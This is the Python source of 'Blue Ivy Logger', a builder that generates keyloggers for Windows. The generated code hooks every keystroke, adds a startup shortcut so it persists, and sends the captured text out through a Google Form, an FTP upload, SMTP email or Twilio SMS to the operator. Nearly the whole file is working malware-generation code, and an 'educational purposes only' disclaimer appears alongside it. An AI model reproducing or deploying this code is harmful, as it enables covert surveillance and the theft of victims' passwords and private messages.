#!/usr/bin/env python
# -*- coding: utf-8 -*- 

from __future__ import print_function
from colorama import init, AnsiToWin32
from colorama import Fore, Back, Style
import os
import sys
#import autopy

init(wrap=False)
stream = AnsiToWin32(sys.stderr).stream

#########################################################################
# Blue Ivy Logger is a powerful keylogger for Windows environments      #
# You have a variety of options to generate your customized logger.     #
# Author takes no responsibility for any kind of damage you cause.      #
# This is developed for educational and research purposes only.         #
# Use this at your own risk.                                            #
#                                                                       #
# Please note this tool may contain errors, and is provided "as it is". #  
# There is no guarantee that it will work on your target system(s), as  #
# the code may have to be adapted. This is to avoid script kiddie       #
# abuse as well.                                                        #
#                                                                       #
# Copyright (C) 2014 Osanda Malith Jayathissa                           #
#                                                                       #
# License: Attribution-NonCommercial-ShareAlike 4.0 International       #
# http://creativecommons.org/licenses/by-nc-sa/4.0/                     #
#                                                                       #
# Blue Ivy Logger by Osanda Malith Jayathissa is licensed under a       #
# Creative Commons Attribution-NonCommercial-ShareAlike                 #
# 4.0 International License. Based on a work at                         #
# http://osandamalith.wordpress.com.                                    #
#########################################################################


try:
    input =  raw_input
except:
    pass

class MainLogger(object):

    def __init__(self, size):
        self.size = size

    def _local(self):
        name = input('[?] Enter a file name to store the keylogs: ')
        _local_ = code()._head_()
        _local_ += ('''
def local():
    global klog_data
    if len(klog_data)>{0}:
        with open("{1}.txt","a") as f:
            f.write(klog_data)
        klog_data=''
    return True
        ''').format(self.size, name)
        
        _local_ += code()._Outkeys_()
        with open("local.py", "wb") as f:
            f.write(_local_)

        print (('[~] Your local keylogger has been created in {0}').\
                format(os.path.abspath('local.py')))

    def _form(self):
        formId = input('[?] Enter your Google Form ID: ')
        entryId = input('[?] Enter yout Google Form entry ID: ')
        _form_ = code()._head_()
        _form_ += '\nimport urllib2, urllib'
        _form_ += ('''
def form():
    global klog_data
    if len(klog_data)>{0}:
        url="https://docs.google.com/forms/d/{1}/formResponse" 
        klog={{'entry.{2}':klog_data}} 
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            klog_data=''
        except Exception, e:
            print (e)
    return True
        ''').format(self.size, formId, entryId)

        _form_ += code()._Outkeys_().replace('local()', 'form()')
        with open("form.py", "w") as f:
            f.write(_form_)

        print (('[~] Your Remote Google Form keylogger has been created in {0}').format(os.path.abspath('form.py')))

    def _ftp(self):
        server = input('[?] Enter your ftp host: ')
        username = input('[?] Enter your ftp username: ')
        password = input('[?] Enter your ftp password: ')
        ssl = input('[?] Enable SSL? ').lower()
        if ssl[0] == 'y':
            ssl = 1
        elif ssl[0] == 'n':
            ssl = 0
        ftpdir = input('[?] Enter your ftp directory: ')
        _ftp_ = code()._head_()
        _ftp_ += '\nimport ftplib\ncounter = 0'
        _ftp_ += ('''
def ftp():
    global klog_data,counter
    if len(klog_data)>{0}:
        counter += 1
        FILENAME = 'logs-' + str(counter) + '.txt'
        with open(FILENAME,"a") as f:
            f.write(klog_data)
        
        klog_data = ''
        try:
            SERVER = "{1}" 
            USERNAME = "{2}" 
            PASSWORD = "{3}" 
            SSL={4} 
            OUTPUT_DIR="{5}" 
            if SSL == 0:
                ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
            else:
                ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp = open(FILENAME, 'rb')
            cmd = 'STOR' +' '+FILENAME
            ft.storbinary(cmd, fp)
            ft.quit()
            fp.close()
            os.remove(FILENAME)
        except Exception, e:
            print e
    return True
    ''').format(self.size, server, username, password, ssl, ftpdir)

        _ftp_ += code()._Outkeys_().replace('local()', 'ftp()')
        with open("ftp.py", "wb") as f:
            f.write(_ftp_)

        print (('[~] Your FTP keylogger has been created in {0}').\
                format(os.path.abspath('ftp.py')))
    
    def _email(self):
        username = input('[-] Enter your E-Mail: ')
        password = input('[-] Enter your Password: ')
        emails = input('[-] Enter the email addresses you want to send:\n[Seprate your addresses with a space]\n').split()

        print ('[~] Select your email server')
        while 1:
            try:
                server = int(input('1. Gmail\n2. Hotmail\n3. Yahoo\n4. Not listed in here\n>>'))
            except ValueError:
                print ('[!] Enter only a number')
                continue
                
            if server == 1:
                server = 'smtp.gmail.com'
                port = 587
                break
            if server == 2:
                server = 'smtp.hotmail.com'
                port = 25
                break
            if server == 3:
                server = 'smtp.mail.yahoo.com'
                port = 465
                break
            if server == 4:
                server = input('[~] Enter your SMTP Server: ')
                port = input('[~] Enter your port number: ')
                break
            else:
                print ('[!] Invalid Choice')
                continue
       

        _email_ = code()._head_() 
        _email_ += '\nimport threading\nimport smtplib\nimport datetime\nimport time\n'  
        _email_ += '''
class Timer(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):

        while not self.event.is_set():
            global klog_data
            if len(klog_data)>{0}:
                ts = datetime.datetime.now()
                SERVER = '{1}' 
                PORT = {2}
                USERNAME = '{3}'
                PASSWORD = '{4}'
                FROM = USERNAME
                TO = {5} 
                SUBJECT = 'Blue Ivy Logger: '+str(ts)
                MESSAGE = klog_data
                message = \"\"\"\
From: %s
To: %s
Subject: %s

%s
\"\"\" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    mail = smtplib.SMTP()
                    mail.connect(SERVER,PORT)
                    mail.starttls()
                    mail.login(USERNAME,PASSWORD)
                    mail.sendmail(FROM, TO, message)
                    klog_data=''
                    mail.quit()
                except Exception as e:
                    print e
            self.event.wait(120)
            '''.format(self.size, server, port, username, password, emails)

        _email_ += code()._Outkeys_().replace('local()', '\nemail = Timer().start()')
        with open("emailer.py", "wb") as f:
            f.write(_email_)

        print (('[~] Your E-Mail keylogger has been created in {0}').\
                format(os.path.abspath('emailer.py')))

    def _sms(self):
        sid = input('[?] Enter your Twilio Account SID: ')
        token = input('[?] Enter your Twilio Account Token: ')
        t_num = input('[?] Enter your Twilio number: ')
        num = input('[?] Enter your phone number: ')
        _sms_ = code()._head_()
        _sms_ += '\nfrom twilio.rest import TwilioRestClient'
        _sms_ += ('''
def sms():
    global klog_data
    if len(klog_data)>{0}:
        ACCOUNT_SID = "{1}" 
        AUTH_TOKEN = "{2}" 
        client = TwilioRestClient(ACCOUNT_SID, AUTH_TOKEN) 
        client.messages.create(body=klog_data, 
            from_="{3}",
            to="{4}" )
        klog_data = ''
    return True
        ''').format(self.size, sid, token, t_num, num)

        _sms_ += code()._Outkeys_().replace('local()', 'sms()')
        with open("sms.py", "wb") as f:
            f.write(_sms_)

        print (('[~] Your SMS keylogger has been created in {0}').\
                format(os.path.abspath('sms.py')))
        
   
class code:
    def _head_(self):
        head = ('''
import os
import sys
import pyHook
import win32api
import winerror
import winshell
import pythoncom 
import win32event  

mutex = win32event.CreateMutex(None, 1, 'blueivy_mutex')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print ('[!] Another instance of this process is running')
    print ('[*] Exiting')
    exit(0)

# use common=1 for all users
startup = winshell.startup () 

winshell.CreateShortcut (
Path=os.path.join (winshell.startup (), "keylogger.lnk"),
Target=sys.executable,
Icon=(sys.executable, 0),
Description="Python"
)

klog_data = ''
        ''')   
        return head

    def _Outkeys_(self):
        output = '''
def keypressed(event):
    global klog_data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    klog_data += keys 
    local()

manager = pyHook.HookManager()
manager.KeyDown = keypressed
manager.HookKeyboard()
pythoncom.PumpMessages()

# This file was generated by the Blue Ivy Logger
# https://github.com/OsandaMalith/BlueIvy
        '''
        return output

def disclaimer():
    terms = autopy.alert.alert(msg="Disclaimer", title='''

 --------------------------------------------------------------
    __##                                          
   /.__.\                                           
   \ \/ /                      
 __/  . \      
 \-)   . )                  
  \___._/                                                      
 ___|_|____Blue Ivy Logger is a powerful keylogger for Windows 
    " "    environments. You have a variety of options to      
 generate your customized logger. Author takes no              
 responsibility for any kind of damage you cause. This is     
 developed for educational and research purposes only. Use     
 this at your own risk. You should not use this to infect      
 remote systems and perform any damage. \n\nClick Ok if you agree  
\nClick Cancel if you don't agree.                     
\n\nCopyright (C) 2014 Osanda Malith Jayathissa                  
 --------------------------------------------------------------

        ''', default_button="OK", cancel_button="candcel")
    return terms

def cls():
    if sys.platform == 'win32': os.system('cls')
    else: os.system('clear')

def main():
    cls()
    print (Style.BRIGHT, Fore.CYAN + '''
      _______   __       __  __   ______       ________  __   __   __  __   
    /_______/\\ /_/\\     /_/\\/_/\\ /_____/\\     /_______/\\/_/\\ /_/\\ /_/\\/_/\\  
    \\::: _  \\ \\\\:\\ \\    \\:\\ \\:\\ \\\\::::_\\/_    \\__.::._\\/\\:\\ \\\\ \\ \\\\ \\ \\ \\ \\ 
     \\::(_)  \\/_\\:\\ \\    \\:\\ \\:\\ \\\\:\\/___/\\      \\::\\ \\  \\:\\ \\\\ \\ \\\\:\\_\\ \\ \\
      \\::  _  \\ \\\\:\\ \\____\\:\\ \\:\\ \\\\::___\\/_     _\\::\\ \\__\\:\\_/.:\\ \\\\::::_\\/
       \\::(_)  \\ \\\\:\\/___/\\\\:\\_\\:\\ \\\\:\\____/\\   /__\\::\\__/\\\\ ..::/ /  \\::\\ \\
        \\_______\\/ \\_____\\/ \\_____\\/ \\_____\\/   \\________\\/ \\___/_(    \\__\\/
                                                
    ''', file=stream)

    print (Style.BRIGHT, Fore.GREEN + '''
         __       ______   _______    _______    ______   ______      
        /_/\\     /_____/\\ /______/\\  /______/\\  /_____/\\ /_____/\\     
        \\:\\ \\    \\:::_ \\ \\\\::::__\\/__\\::::__\\/__\\::::_\\/_\\:::_ \\ \\    
         \\:\\ \\    \\:\\ \\ \\ \\\\:\\ /____/\\\\:\\ /____/\\\\:\\/___/\\\\:(_) ) )_  
          \\:\\ \\____\\:\\ \\ \\ \\\\:\\\\_  _\\/ \\:\\\\_  _\\/ \\::___\\/_\\: __ `\\ \\ 
           \\:\\/___/\\\\:\\_\\ \\ \\\\:\\_\\ \\ \\  \\:\\_\\ \\ \\  \\:\\____/\\\\ \\ `\\ \\ \\
            \\_____\\/ \\_____\\/ \\_____\\/   \\_____\\/   \\_____\\/ \\_\\/ \\_\\/

    ''' + Style.RESET_ALL, file=stream)

    print ('\t['+Style.BRIGHT, Fore.RED +'*'+ Style.RESET_ALL+' ]', end='' ,file=stream) 
    print (Style.BRIGHT, Fore.MAGENTA + 'Welcome to the Blue Ivy Logger\n'+ Style.RESET_ALL,file=stream)


    print ('\t['+Style.BRIGHT, Fore.RED +'~'+ Style.RESET_ALL+' ]', end='' ,file=stream) 
    print (Style.BRIGHT, Fore.YELLOW + 'Author: '+ Style.RESET_ALL, end='' ,file=stream)
    print (Style.DIM, Fore.WHITE +'Osanda Malith Jayathissa'+ Style.RESET_ALL, file=stream)

    print ('\t['+Style.BRIGHT, Fore.RED +'~'+ Style.RESET_ALL+' ]', end='' ,file=stream) 
    print (Style.BRIGHT, Fore.YELLOW + 'Follow: '+ Style.RESET_ALL, end='' ,file=stream)
    print (Style.DIM, Fore.WHITE +'@OsandaMalith'+ Style.RESET_ALL, file=stream)
    try:
        #terms = disclaimer()
        #if terms == False: sys.exit(0) 
        #else: pass
        choice = int(input('\n[-] What do you like to generate?\n1. A Local Keylogger\n2. Google Forms Logger\n3. FTP Logger\
            \n4. E-Mail Logger\n5. SMS Logger \n6. Exit\n>>'))
        if choice == 6: exit(0)
        while 1:
            try:
                size = int(input('\n[*] Enter your size: '))
            except ValueError:
                print ('[!] Enter only a number')
                continue
            if choice == 1:
                MainLogger(size)._local()
                break
            if choice == 2:
                MainLogger(size)._form()
                break
            if choice == 3:
                MainLogger(size)._ftp()
                break
            if choice == 4:
                MainLogger(size)._email()
                break
            if choice == 5:
                MainLogger(size)._sms()
                break
            else:
                print ('[!] Invalid Input')
                continue

    except KeyboardInterrupt:
        print ('[!] Ctrl + C detected\n[!] Exiting')
        sys.exit(0)
    except EOFError:
        print ('[!] Ctrl + D detected\n[!] Exiting')
        sys.exit(0)
    except Exception as e:
        print (e)
if __name__ == '__main__':
    main()
#EOF
